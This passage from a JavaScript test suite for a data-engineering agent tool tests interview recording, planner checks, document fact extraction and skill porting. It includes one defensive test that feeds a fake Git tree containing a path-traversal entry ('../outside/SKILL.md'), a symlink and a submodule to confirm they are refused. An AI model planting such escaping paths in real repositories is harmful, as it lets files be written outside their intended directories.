      r = g("SELECT * FROM STREAM read_files('/Volumes/c/s/v/', format => 'csv'); SELECT * FROM read_files('/x') ; SELECT q.query_id FROM snowflake.account_usage.query_history q; SELECT 1 FROM system.query.history; REVOKE SELECT ON TABLE shop.orders FROM ROLE analyst; REVOKE USAGE ON SCHEMA s FROM DATABASE ROLE r");
      assert.deepStrictEqual(r.unresolved, [], JSON.stringify(r.unresolved));
      r = g("CREATE DYNAMIC TABLE IF NOT EXISTS staging.stg_x TARGET_LAG = '1 hour' WAREHOUSE = w AS SELECT 1 AS a; CREATE STREAM IF NOT EXISTS s.chg ON TABLE shop.orders; SELECT * FROM stg_x JOIN s.chg c ON 1 = 1");
      assert.deepStrictEqual(r.unresolved, [], 'created platform objects are internal');
      const DM = fresh('../dist/engine/platform/dialectMarkers.js');
      assert.deepStrictEqual(DM.dialectMarkers("COPY INTO t FROM @s/x FILE_FORMAT = (TYPE = CSV) -- OPTIMIZE t\nPATTERN = '.*'"), { snowflake: ['a stage reference (@stage)', 'FILE_FORMAT ='], databricks: [] }, 'comments and strings are not markers');
      assert.deepStrictEqual(DM.foreignDialect("SELECT * FROM read_files('/Volumes/a/b/c/')", 'snowflake'), ['read_files() / cloud_files()', 'a Unity Catalog volume path']);
      assert.deepStrictEqual(DM.foreignDialect('MERGE INTO t USING s ON t.k = s.k WHEN MATCHED THEN UPDATE SET a = s.a QUALIFY 1 = 1', 'databricks'), [], 'shared SQL is no marker');
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  // ── v0.45.12: the interview on disk, the business analyst, the planner's briefs ──

  await test('v0.45.12: the interview on disk — questions and answers with who and where, by question id or by field, refused item by item when wrong; parts covered; open until it feeds a specification (mid-synthesis counts as open)', () => {
    const nodeFs = require('node:fs'); const os = require('node:os');
    const S = fresh('../dist/engine/interview/state.js');
    const { interviewSkills } = fresh('../dist/engine/skills/skillRegistry.js');
    const parts = interviewSkills(fresh('../dist/engine/agents/definitions.js').loadSkillPack(wfRes()).skills);
    const root = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-iv-'));
    try {
      let s = S.startInterview(root, 'Daily revenue from the shop orders', parts, { now: '2026-10-23T10:00:00.000Z' });
      assert.ok(nodeFs.existsSync(nodePath.join(root, 'interview', 'state.yaml')));
      assert.strictEqual(S.startInterview(root, 'ignored', parts).id, s.id, 'the open interview is continued, not restarted');
      let r = S.recordInterview(s, { questions: [{ field: 'sourceCatalog', prompt: 'Which systems hold the orders?' }, { field: 'colour', prompt: 'x' }] }, { by: 'user (via MCP)', channel: 'mcp' });
      assert.deepStrictEqual([r.asked, r.errors.length], [['q-1'], 1]);
      assert.match(r.errors[0], /"colour" is not a field this interview covers/);
      r = S.recordInterview(r.session, { answers: [{ questionId: 'q-1', value: 'The shop OLTP and the CRM' }, { field: 'scope', prompt: 'What is out of scope?', value: 'Returns' }, { questionId: 'q-9', value: 'x' }, { field: 'scope', value: '  ' }] }, { by: 'priya', channel: 'cli' });
      assert.deepStrictEqual(r.answered, ['q-1', 'q-2']);
      assert.strictEqual(r.errors.length, 2);
      S.writeInterview(root, r.session);
      s = S.readInterview(root);
      assert.deepStrictEqual(s.answers.map((a) => [a.questionId, a.by, a.channel]), [['q-1', 'priya', 'cli'], ['q-2', 'priya', 'cli']]);
      const v = S.summarizeInterview(s, parts);
      assert.deepStrictEqual([v.status, v.open.length, v.parts.find((p) => p.skill === 'source-catalog').status, v.parts.find((p) => p.skill === 'requirements-discovery').status, v.parts.find((p) => p.skill === 'transformations').status], ['open', 0, 'partial', 'partial', 'not-started']);
      assert.strictEqual(v.answered[1].prompt, 'What is out of scope?');
      S.writeInterview(root, { ...s, state: 'synthesizing' });
      assert.ok(S.isOpenInterview(S.readInterview(root)), 'a reload during synthesis resumes it');
      assert.strictEqual(S.markInterviewFed(root, { id: 'spec-1', version: 2 }, 'panel'), true);
      s = S.readInterview(root);
      assert.deepStrictEqual([S.isOpenInterview(s), s.feeds.version, S.summarizeInterview(s, parts).status, S.markInterviewFed(root, { id: 'spec-1', version: 3 }, 'mcp')], [false, 2, 'done', false]);
      assert.notStrictEqual(S.startInterview(root, 'A revision', parts).id, s.id, 'a closed interview is kept as the record; the next one is new');
    } finally { nodeFs.rmSync(root, { recursive: true, force: true }); }
  });

  await test('v0.45.12: an interview started over MCP is continued in a terminal and over MCP again, each answer recorded with its surface; proposing the specification closes it (BPS-7 across surfaces)', async () => {
    const nodeFs = require('node:fs'); const os = require('node:os');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-ivx-'));
    const client = await mcpSession(ws);
    try {
      const call = async (name, args = {}) => (await client.callTool({ name, arguments: args })).structuredContent;
      const started = await call('autode_start_problem', { problemStatement: 'Daily revenue from the shop orders, by channel' });
      let st = await call('autode_interview_state');
      assert.deepStrictEqual([st.status, st.parts.length, st.open.length], ['open', 6, 0]);
      const rec = await call('autode_interview_record_answer', { questions: [{ field: 'sourceCatalog', prompt: 'Which systems hold the orders?' }, { field: 'scope', prompt: 'Which channels are in scope?' }], answers: [{ field: 'objectives', prompt: 'What must the report show?', value: 'Revenue by day and channel' }] });
      assert.deepStrictEqual([rec.asked.length, rec.answered.length, rec.open.length], [2, 1, 2]);
      // A terminal continues it.
      let r = await cli(['interview', 'show', '--workspace', ws]);
      assert.ok(r.code === 0 && /2 open question/.test(r.out) && /Which systems hold the orders\?/.test(r.out) && /Revenue by day and channel — user \(via MCP\), mcp/.test(r.out), r.out);
      const qid = st = (await call('autode_interview_state')).open[0].id;
      r = await cli(['interview', 'answer', qid, 'Shop OLTP and the CRM', '--workspace', ws]);
      assert.ok(r.code === 0 && /1 question\(s\) still open/.test(r.out), r.out + r.err);
      assert.strictEqual((await cli(['interview', 'answer', 'q-99', 'x', '--workspace', ws])).code, 5);
      st = await call('autode_interview_state');
      assert.deepStrictEqual(st.answered.map((a) => a.channel), ['mcp', 'cli']);
      // Proposing the specification closes the interview: no surface resumes it.
      const spec = fresh('../dist/engine/context/Yaml.js').parseYaml(nodeFs.readFileSync(nodePath.join(ws, '.autode', 'problems', started.id, 'spec', 'business-problem.yaml'), 'utf8'));
      const prop = await call('autode_propose_spec_change', { spec: { ...spec, objectives: ['Revenue by day and channel'], scope: { in: ['Shop and CRM orders'], out: ['Returns'] } } });
      assert.ok(prop.decision && prop.decision.validation.ok, JSON.stringify(prop));
      st = await call('autode_interview_state');
      assert.strictEqual(st.status, 'done');
      const late = await client.callTool({ name: 'autode_interview_record_answer', arguments: { answers: [{ field: 'scope', value: 'x' }] } });
      assert.ok(late.isError && /already fed specification/.test(JSON.stringify(late.content)));
    } finally { await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.12: the business analyst does the specify stage with the interview skills; the planner does the plan stage and alone may propose the workflow; the draft is read without proposing anything', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-plan-'));
    try {
      const { id, W } = await tinyFlow(ws, cli);
      const A = fresh('../dist/engine/agents/assignment.js');
      const scope = { workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id, home: ws };
      const tools = [{ name: 'autode_propose_workflow', annotations: {} }, { name: 'autode_workflow_draft', annotations: { readOnlyHint: true } }, { name: 'autode_interview_state', annotations: { readOnlyHint: true } }, { name: 'autode_interview_record_answer', annotations: {} }, { name: 'autode_propose_spec_change', annotations: {} }];
      const plan = A.assignmentFor(scope, 'plan', tools).assignment;
      assert.deepStrictEqual([plan.role, plan.skills.map((k) => k.id), plan.engineTools], ['planner', ['autode-core-workflow-planning'], ['autode_propose_workflow', 'autode_workflow_draft']]);
      const spec = A.assignmentFor(scope, 'specify', tools).assignment;
      assert.deepStrictEqual([spec.role, spec.skills.length, spec.engineTools], ['business-analyst', 8, ['autode_interview_record_answer', 'autode_interview_state', 'autode_propose_spec_change']]);
      assert.ok(!A.toolsForTier(tools, 'propose', ['autode_propose_workflow'], 'build').includes('autode_propose_workflow'), 'no other stage re-plans');
      const Sv = fresh('../dist/engine/workflows/service.js');
      const before = nodeFs.readFileSync(nodePath.join(ws, '.autode', 'problems', id, 'workflow.yaml'), 'utf8');
      const d = Sv.computeDraft({ workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id }, 'tiny');
      assert.ok(d.workflow.stages.some((s) => s.id === 'mapping') && d.template.id === 'tiny');
      assert.strictEqual(nodeFs.readFileSync(nodePath.join(ws, '.autode', 'problems', id, 'workflow.yaml'), 'utf8'), before, 'nothing written');
      assert.ok(W.length);
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.12: the plan check refuses briefs that carry method (tool or skill names) or are too long, and skills that don\'t exist or don\'t fit the stage; the planning skill\'s example brief passes', () => {
    const I = fresh('../dist/engine/workflows/instance.js');
    const T = fresh('../dist/engine/workflows/templates.js');
    const { templates } = T.loadTemplates(wfRes(), undefined);
    const template = templates.find((t) => t.id === 'modernization');
    const w = I.draftWorkflow(template, 'p1', {}, []);
    const mapping = w.stages.find((s) => s.kind === 'mapping');
    const skills = fresh('../dist/engine/agents/definitions.js').loadSkillPack(wfRes()).skills.map((k) => ({ id: k.id, stageKinds: k.meta.stageKinds }));
    const md = require('node:fs').readFileSync(nodePath.join(wfRes(), 'skills', 'autode-core-workflow-planning', 'SKILL.md'), 'utf8');
    const example = /^> (.+)$/m.exec(md)[1];
    mapping.agent = { role: 'sttm-mapper', brief: example, skills: ['autode-de-mapping'] };
    assert.deepStrictEqual(I.checkWorkflow(w, template, { skills }).errors, []);
    mapping.agent = { role: 'sttm-mapper', brief: 'Use autode_match_columns and the autode-de-mapping skill on shop.orders.', skills: ['autode-de-modelling', 'autode-de-ghost'] };
    const errs = I.checkWorkflow(w, template, { skills }).errors.join('\n');
    assert.match(errs, /the brief names autode_match_columns, autode-de-mapping\. A brief carries context only/);
    assert.match(errs, /skill autode-de-modelling is for modelling stages, not mapping/);
    assert.match(errs, /skill autode-de-ghost doesn't exist/);
    mapping.agent = { role: 'sttm-mapper', brief: 'x'.repeat(I.MAX_BRIEF + 1) };
    assert.match(I.checkWorkflow(w, template).errors.join('\n'), /keep it under 1500/);
  });

  // ── v0.45.13: the context curator ──

  await test('v0.45.13: a host\'s model reads pack documents through the same steps as the panel\'s LLM — facts cite real sections and are checked (dropped with reasons, duplicates skipped, a changed document refused); a new format gets a profile proposed for review, then applied', async () => {
    const fs = require('node:fs'); const p = require('node:path');
    const env = await k2.cfm();
    try {
      fs.mkdirSync(p.join(env.dir, 'docs'), { recursive: true });
      fs.writeFileSync(p.join(env.dir, 'docs', 'contract.yaml'), c4a.read('documents/pack/customer-contract.v1.yaml'));
      fs.writeFileSync(p.join(env.dir, 'docs', 'brd.md'), c4a.read('documents/pack/brd.md'));
      const { BusinessPackManager } = require('../dist/context/BusinessPackManager.js');
      const pm = new BusinessPackManager(p.join(env.dir, '.autode', 'problems', 'x', 'pack'), env.dir, () => env.cfm, () => {});
      await pm.load();
      await pm.addDocument({ path: 'docs/contract.yaml', role: 'contract', authority: 'signed', version: '1' });
      await pm.addDocument({ path: 'docs/brd.md', role: 'brd', authority: 'draft', version: '1' });
      // A structured document in a new format: a profile, proposed, reviewed, then applied deterministically.
      let r = pm.readingFor('contract');
      assert.strictEqual(r.kind, 'profile');
      assert.match(r.prompt.system, /never extract the data itself/);
      const prof = await pm.recordProfile('contract', { ...c4a.profile(), id: 'house-contract', status: 'confirmed' });
      assert.ok(prof.status === 'profile_proposed' && /status: proposed/.test(fs.readFileSync(prof.profilePath, 'utf8')), 'a model cannot confirm its own profile');
      assert.match(pm.readingFor('contract').reason, /waiting for a person's review/);
      fs.writeFileSync(prof.profilePath, fs.readFileSync(prof.profilePath, 'utf8').replace('status: proposed', 'status: confirmed'));
      await pm.load();
      assert.match(pm.readingFor('contract').reason, /no model needed/);
      assert.strictEqual((await pm.applyDocument('contract')).status, 'applied');
      assert.strictEqual((await pm.recordProfile('contract', { ...c4a.profile(), id: 'house-contract' })).status, 'error', 'a confirmed profile is not overwritten');
      // Free text: facts that cite their section.
      r = pm.readingFor('brd');
      assert.ok(r.kind === 'facts' && r.sections.length > 1 && /^[0-9a-f]{64}$/.test(r.sha), JSON.stringify(r).slice(0, 300));
      const section = r.sections[1].id;
      const facts = [
        { section, kind: 'business_term', subject: ['customer'], predicate: 'defined_as', value: { term: 'customer', definition: 'A person with at least one order' }, statement: 'A customer is a person with at least one order.', quote: 'Finance needs daily net revenue' },
        { section: 'no-such-section', kind: 'decision', subject: ['x'], predicate: 'is', value: { text: 'x' }, statement: 'x', quote: 'x' },
        { section, kind: 'opinion', subject: ['x'], predicate: 'is', value: {}, statement: 'x', quote: 'per sales channel' }
      ];
      assert.strictEqual((await pm.recordFacts('brd', { facts }, 'stale')).status, 'error', 'a document changed since it was read is read again');
      const out = await pm.recordFacts('brd', { facts }, r.sha);
      assert.deepStrictEqual([out.status, out.proposed, out.dropped.length], ['extracted', 1, 2]);
      assert.ok(out.dropped.some((d) => /unknown section/.test(d)) && out.dropped.some((d) => /not extractable/.test(d)));
      const fact = env.cfm.getLedger().assertions().find((a) => a.kind === 'business_term' && a.status === 'proposed' && a.subject.join() === 'customer');
      assert.ok(fact && fact.evidence[0].ref.includes(section), 'cites its section');
      assert.strictEqual((await pm.recordFacts('brd', { facts }, r.sha)).proposed, 0, 'duplicates skipped');
      assert.strictEqual((await pm.recordFacts('contract', { facts })).status, 'error', 'structured documents are read by their profile');
      // The panel's LLM goes through the same steps: it is asked the same prompt.
      const asked = [];
      const panel = new BusinessPackManager(p.join(env.dir, '.autode', 'problems', 'x', 'pack'), env.dir, () => env.cfm, () => {}, async (system, user) => { asked.push(user); return { facts: [facts[0]] }; });
      await panel.load();
      const viaPanel = await panel.applyDocument('brd');
      assert.deepStrictEqual([viaPanel.status, viaPanel.proposed, asked[0] === r.prompt.user], ['extracted', 0, true]);
    } finally { env.cleanup(); }
  });

  await test('v0.45.13: the context curator — role template with the fact-extraction, document-reading and vocabulary skills; the reading tools over MCP; the skills are AutoDE\'s own (no stage), listed in the catalog and the plugin', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs');
    const D = fresh('../dist/engine/agents/definitions.js');
    const curator = D.loadRoles(wfRes()).roles.find((r) => r.name === 'context-curator');
    assert.deepStrictEqual(curator.skills, ['autode-core-fact-extraction', 'autode-core-document-reading', 'autode-core-vocabulary']);
    const pack = D.loadSkillPack(wfRes()).skills;
    for (const id of curator.skills) assert.deepStrictEqual(pack.find((k) => k.id === id).meta.stageKinds, [], id);
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-cur-'));
    const client = await mcpSession(ws);
    try {
      const call = async (name, args = {}) => (await client.callTool({ name, arguments: args })).structuredContent;
      await call('autode_start_problem', { problemStatement: 'Daily revenue from the shop orders, by channel' });
      nodeFs.writeFileSync(nodePath.join(ws, 'brd.md'), c4a.read('documents/pack/brd.md'));
      const doc = (await call('autode_pack_add', { path: 'brd.md', role: 'brd', version: '1' })).document;
      const reading = await call('autode_pack_reading', { id: doc.id });
      assert.ok(reading.kind === 'facts' && reading.prompt.system && /autode_pack_record_reading/.test(reading.next));
      const rec = await call('autode_pack_record_reading', { id: doc.id, sha: reading.sha, facts: [{ section: reading.sections[0].id, kind: 'assumption', subject: ['orders'], predicate: 'assumes', value: { text: 'Orders arrive daily' }, statement: 'Orders arrive daily.', quote: 'Retail analytics' }] });
      assert.deepStrictEqual([rec.status, rec.proposed], ['extracted', 1]);
      const both = await client.callTool({ name: 'autode_pack_record_reading', arguments: { id: doc.id } });
      assert.ok(both.isError && /facts \(free text\) or profile/.test(JSON.stringify(both.content)));
    } finally { await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  // ── v0.45.14: the code audit's follow-ups ──

  await test('v0.45.14: one way per stage — the build stage\'s Pipeline Spec comes from its agent only (no separate Produce); the mapping stage keeps Produce for a person\'s own mapping', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-onepath-'));
    try {
      const { id, W } = await tinyFlow(ws, cli);
      assert.strictEqual((await cli(['workflow', 'approve', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] })).code, 0);
      const m = fresh('../dist/core/workflowViewModel.js').buildWorkflowModel({ workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id });
      const build = m.stages.find((s) => s.id === 'build');
      const mapping = m.stages.find((s) => s.id === 'mapping');
      assert.ok(!build.actions.includes('produce') && build.produceLabel === undefined, JSON.stringify(build.actions));
      assert.ok(!/Generate the Pipeline Spec/.test(build.guide), build.guide);
      assert.ok(mapping.actions.includes('produce') && mapping.produceLabel === 'Add a mapping…');
      assert.ok(!require('node:fs').existsSync(nodePath.join(__dirname, '..', 'dist', 'agents', 'pipelineSpecSynthesis.js')), 'the one-shot synthesis is gone');
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.14: refresh on use before a stage — autode_refresh_working_set over MCP (nothing bound: nothing fetched, nothing created in the estate); the orchestrator calls it before an assignment; the catalog reports roles naming unknown skills through checkDefinitions', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-refresh-'));
    const client = await mcpSession(ws);
    try {
      const r = (await client.callTool({ name: 'autode_refresh_working_set', arguments: {} })).structuredContent;
      assert.deepStrictEqual([r.checked, r.fetched, r.unreachable], [0, 0, []]);
      assert.ok(!nodeFs.existsSync(nodePath.join(ws, '.autode', 'knowledge', 'estate.yaml')) || !/system:/.test(nodeFs.readFileSync(nodePath.join(ws, '.autode', 'knowledge', 'estate.yaml'), 'utf8')), 'no estate system created');
      const orch = nodeFs.readFileSync(nodePath.join(wfRes(), 'skills', 'autode-core-orchestrator', 'SKILL.md'), 'utf8');
      assert.match(orch, /If there is an assignment, first call `autode_refresh_working_set`/);
      const dir = nodePath.join(ws, '.autode', 'config', 'agents');
      nodeFs.mkdirSync(dir, { recursive: true });
      nodeFs.writeFileSync(nodePath.join(dir, 'ghost-writer.md'), '---\nname: ghost-writer\ndescription: Writes ghosts\ntools: [autode_resolve]\nskills: [autode-de-ghost]\n---\nBoo.\n');
      const cat = fresh('../dist/engine/agents/skillCatalog.js').skillCatalog({ resourcesRoot: wfRes(), workspaceRoot: ws, home: ws, env: { PATH: '' } });
      assert.ok(cat.errors.includes('role ghost-writer: unknown skill "autode-de-ghost".'), cat.errors.join('\n'));
    } finally { await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.46.0: port a skill — staged within caps (a Git repository too, at a recorded commit), discovered, analysed (knowledge or procedure, scripts, CLIs with their install guide, licence), a capability report; imported unreviewed; a skill with scripts is not published unreviewed; a non-redistributable licence is refused', async () => {
    const path = require('node:path'); const fs = require('node:fs'); const os = require('node:os');
    const port = require('../dist/engine/skills/port.js');
    const lc = require('../dist/engine/skills/lifecycle.js');
    const ex = path.join(__dirname, '..', 'examples', 'skills');
    const staged = port.stageSource({ kind: 'local', location: ex });
    assert.deepStrictEqual(port.discoverSkills(staged.dir).map((f) => f.subpath), ['table-freshness-check', 'team-sql-conventions']);
    const ctx = { installed: [], autode: [], guides: [{ id: 'snowflake-cli' }, { id: 'databricks-cli' }], repoRoot: ex };
    const proc = port.analyzeSkill(path.join(ex, 'table-freshness-check'), 'table-freshness-check', ctx);
    assert.strictEqual(proc.classification.value, 'procedure');
    assert.ok(proc.executes && proc.writes, 'Bash is declared: it acts');
    assert.deepStrictEqual(proc.scripts, ['scripts/check_freshness.py']);
    assert.deepStrictEqual(proc.clis, [{ name: 'python', guide: undefined }, { name: 'snow', guide: 'snowflake-cli' }]);
    assert.strictEqual(proc.licence.spdx, 'MIT');
    assert.deepStrictEqual(proc.problems, []);
    const know = port.analyzeSkill(path.join(ex, 'team-sql-conventions'), 'team-sql-conventions', ctx);
    assert.strictEqual(know.classification.value, 'knowledge');
    assert.ok(!know.executes && !know.writes);
    const report = port.capabilityReport(proc, staged.provenance);
    assert.match(report, /\*\*Kind:\*\* procedure/);
    assert.match(report, /Limit \(mcp-engine §3\.1\)/);
    assert.match(report, /CLI `snow` \(AutoDE can guide its install: snowflake-cli\)/);
    assert.doesNotMatch(port.capabilityReport(know), /Limit \(mcp-engine/);

    // Caps: refused before anything is read further.
    assert.throws(() => port.stageSource({ kind: 'local', location: ex }, { maxFiles: 1, maxBytes: 1e9, maxFileBytes: 1e9 }), /More than 1 files/);

    // The model proposes; a person decides. Unknown AutoDE tools are not mapped.
    const parsed = port.parsePortProposal({ classification: 'knowledge', why: 'reference', summary: 's', toolMapping: [{ mentioned: 'Bash', autodeTool: 'autode_run_command' }, { mentioned: 'x', autodeTool: 'made_up' }], prerequisites: [{ name: 'snow', kind: 'cli' }] }, ['autode_run_command']);
    assert.deepStrictEqual(parsed.errors, []);
    assert.deepStrictEqual(parsed.proposal.toolMapping.map((m) => m.autodeTool), ['autode_run_command', null]);
    assert.strictEqual(port.parsePortProposal({ classification: 'both' }, []).errors.length, 1);
    const withProposal = { ...proc, proposal: parsed.proposal };
    assert.strictEqual(port.decideProposal(withProposal, 'reject').classification.value, 'procedure');
    const accepted = port.decideProposal(withProposal, 'accept', 'procedure');
    assert.deepStrictEqual([accepted.classification.value, accepted.classification.by, accepted.proposal.status], ['procedure', 'person', 'accepted']);

    // Import: unreviewed, a draft under lifecycle management, analysis beside it (not part of the content).
    const ws = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-port-ws-'));
    const imp = port.importSkill({ workspaceRoot: ws, stagedDir: staged.dir, analysis: proc, provenance: staged.provenance, by: 'arun', managementEnabled: true });
    assert.deepStrictEqual([imp.sidecar.status, imp.sidecar.trustTier, imp.sidecar.provenance.source, imp.sidecar.provenance.licence, imp.sidecar.provenance.subpath], ['draft', 'unreviewed', 'local', 'MIT', 'table-freshness-check']);
    assert.ok(fs.existsSync(path.join(imp.dir, port.ANALYSIS_FILENAME)));
    assert.strictEqual(lc.skillContentChecksum(imp.dir), imp.sidecar.provenance.contentChecksum, 'the analysis file is not content');
    assert.throws(() => lc.publishToolSkill(imp.dir, 'arun'), /Review it before publishing: it carries scripts \(scripts\/check_freshness\.py\)/);
    lc.setTrustTier(imp.dir, 'reviewed', 'arun');
    assert.strictEqual(lc.publishToolSkill(imp.dir, 'arun').sidecar.status, 'published');
    assert.throws(() => port.importSkill({ workspaceRoot: ws, stagedDir: staged.dir, analysis: proc, provenance: staged.provenance, by: 'arun' }), /already imported: replace it/);

    // A non-redistributable licence is refused.
    const lic = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-port-lic-'));
    fs.writeFileSync(path.join(lic, 'SKILL.md'), '---\nname: vendor-skill\ndescription: d\n---\nbody\n');
    fs.writeFileSync(path.join(lic, 'LICENSE'), 'Databricks License\nCopyright (2024) Databricks, Inc.\n');
    const bad = port.analyzeSkill(lic, '', { ...ctx, repoRoot: lic });
    assert.match(bad.problems.join(' '), /Databricks License.*doesn't allow copying/);
    assert.throws(() => port.importSkill({ workspaceRoot: ws, stagedDir: lic, analysis: bad, provenance: { source: 'local', location: lic }, by: 'arun' }), /can't be imported/);
    staged.cleanup();

    // A Git repository: cloned without checkout, listed and checked, then checked out; the commit is recorded.
    const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-port-repo-'));
    const git = (...a) => { const r = require('node:child_process').spawnSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.com', ...a], { cwd: repo, encoding: 'utf8' }); assert.strictEqual(r.status, 0, r.stderr); return r.stdout.trim(); };
    git('init', '-q');
    fs.mkdirSync(path.join(repo, 'skills', 'conventions'), { recursive: true });
    fs.copyFileSync(path.join(ex, 'team-sql-conventions', 'SKILL.md'), path.join(repo, 'skills', 'conventions', 'SKILL.md'));
    git('add', '.'); git('commit', '-q', '-m', 'one');
    const head = git('rev-parse', 'HEAD');
    const gs = port.stageSource({ kind: 'git', location: repo });
    assert.deepStrictEqual([gs.provenance.source, gs.provenance.resolvedCommit, gs.files], ['git', head, 1]);
    assert.deepStrictEqual(port.discoverSkills(gs.dir).map((f) => f.subpath), ['skills/conventions']);
    assert.throws(() => port.stageSource({ kind: 'git', location: repo }, { maxFiles: 10, maxBytes: 10, maxFileBytes: 1e9 }), /larger than 10 bytes\. Nothing was copied/);
    assert.throws(() => port.stageSource({ kind: 'git', location: 'not a url' }), /not a Git URL/);
    // A hostile tree is refused from its listing, before checkout (git itself won't create one, so a fake runner lists it).
    const fakeGit = (entries) => { const calls = []; return { calls, run: (args) => { calls.push(args[0]); return args[0] === 'ls-tree' ? { status: 0, stdout: entries.join('\0') + '\0', stderr: '' } : { status: 0, stdout: '', stderr: '' }; } }; };
    for (const [entry, why] of [['100644 blob abc 10\t../outside/SKILL.md', /escapes it: \.\.\/outside\/SKILL\.md\. Nothing was copied/], ['120000 blob abc 10\tskills/link', /skills\/link is a symbolic link/], ['160000 commit abc -\tvendor', /vendor is a Git submodule/]]) {
      const f = fakeGit(['100644 blob abc 10\tskills/a/SKILL.md', entry]);
      assert.throws(() => port.stageSource({ kind: 'git', location: 'https://example.com/x.git' }, port.SOURCE_CAPS, f.run), why);
      assert.deepStrictEqual(f.calls, ['clone', 'ls-tree'], 'never checked out');
    }
    const ka = port.analyzeSkill(path.join(gs.dir, 'skills', 'conventions'), 'skills/conventions', { ...ctx, repoRoot: gs.dir });
    const k = port.importSkill({ workspaceRoot: ws, stagedDir: gs.dir, analysis: ka, provenance: gs.provenance, by: 'arun', managementEnabled: true });
    gs.cleanup();
    assert.ok(!fs.existsSync(gs.dir), 'the clone is removed');
    assert.deepStrictEqual([k.sidecar.provenance.repoUrl, k.sidecar.provenance.resolvedCommit], [repo, head]);
  });

  await test('v0.46.0: knowledge skills — published and reviewed ones join the context packs whose question they match (a quarter of the budget, named in the manifest); Update Skill shows the diff and the new content is unreviewed again', async () => {
    const path = require('node:path'); const fs = require('node:fs'); const os = require('node:os');
    const port = require('../dist/engine/skills/port.js');
    const lc = require('../dist/engine/skills/lifecycle.js');
    const { buildContextPack, renderPackManifest } = require('../dist/engine/context/contextPack.js');
    const ex = path.join(__dirname, '..', 'examples', 'skills');
    const src = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-port-src-'));
    fs.cpSync(path.join(ex, 'team-sql-conventions'), path.join(src, 'team-sql-conventions'), { recursive: true });
    const ws = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-port-ks-'));
    const staged = port.stageSource({ kind: 'local', location: src });
    const a = port.analyzeSkill(path.join(src, 'team-sql-conventions'), 'team-sql-conventions', { installed: [], autode: [], repoRoot: src });
    const k = port.importSkill({ workspaceRoot: ws, stagedDir: staged.dir, analysis: a, provenance: staged.provenance, by: 'arun', managementEnabled: true });
    lc.publishToolSkill(k.dir, 'arun');
    assert.deepStrictEqual(port.knowledgeSkills(ws), [], 'unreviewed: not in packs');
    lc.setTrustTier(k.dir, 'reviewed', 'arun');
    const ks = port.knowledgeSkills(ws);
    assert.deepStrictEqual(ks.map((s) => s.id), ['team-sql-conventions']);

    const empty = { graph: { nodes: [], edges: [] }, assertions: [], conflicts: [] };
    const pack = buildContextPack({ purpose: 'step', query: 'write the incremental staging model for orders following our naming conventions' }, { ...empty, knowledgeSkills: ks });
    assert.match(pack.text, /## Team Knowledge\n### team-sql-conventions \(skill `team-sql-conventions`\)\n# Team SQL conventions/);
    assert.deepStrictEqual(pack.manifest.knowledgeSkills, ['team-sql-conventions']);
    assert.match(renderPackManifest(pack, 't'), /Team knowledge:\*\* `team-sql-conventions`/);
    const small = buildContextPack({ purpose: 'step', query: 'incremental naming conventions', maxTokens: 1200 }, { ...empty, knowledgeSkills: ks });
    assert.match(small.text, /cut to fit the pack/);
    const other = buildContextPack({ purpose: 'step', query: 'list the kafka topics of the clickstream' }, { ...empty, knowledgeSkills: ks });
    assert.doesNotMatch(other.text, /Team Knowledge/);
    assert.strictEqual(other.manifest.knowledgeSkills, undefined);

    // Update Skill: re-fetch, diff, and the new content is unreviewed (S2 trust is bound to content).
    const md = path.join(src, 'team-sql-conventions', 'SKILL.md');
    fs.writeFileSync(md, fs.readFileSync(md, 'utf8').replace('- Comments explain *why*, not *what*.', '- Comments explain *why*, not *what*.\n- Every mart has an owner in its YAML.'));
    const up = port.stageUpdate(k.dir);
    const diff = port.diffSkill(k.dir, up.freshDir);
    assert.deepStrictEqual(diff.map((d) => [d.path, d.change]), [['SKILL.md', 'changed']]);
    assert.strictEqual(diff[0].diff, '+ - Every mart has an owner in its YAML.');
    const fresh = port.analyzeSkill(up.freshDir, 'team-sql-conventions', { installed: [], autode: [], repoRoot: src });
    const sc = port.applyUpdate(k.dir, up.staged, up.freshDir, fresh, 'arun');
    up.staged.cleanup();
    assert.strictEqual(sc.trustTier, 'unreviewed');
    assert.strictEqual(sc.transitions.at(-1).action, 'update');
    assert.match(fs.readFileSync(path.join(k.dir, 'SKILL.md'), 'utf8'), /owner in its YAML/);
    assert.deepStrictEqual(port.knowledgeSkills(ws), [], 'changed since review: out of packs until reviewed again');
    assert.strictEqual(port.readAnalysis(k.dir).classification.value, 'knowledge');
  });

  await test('v0.46.0: port a skill on every surface — the CLI analyses and imports (several skills: choose with --skill), review and publish are a person\'s acts in a terminal; autode_skills_analyze over MCP reads only; the Port a Skill wizard goes source → report → import → review → publish, each change confirmed', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-port-cli-'));
    const ex = nodePath.join(__dirname, '..', 'examples', 'skills');
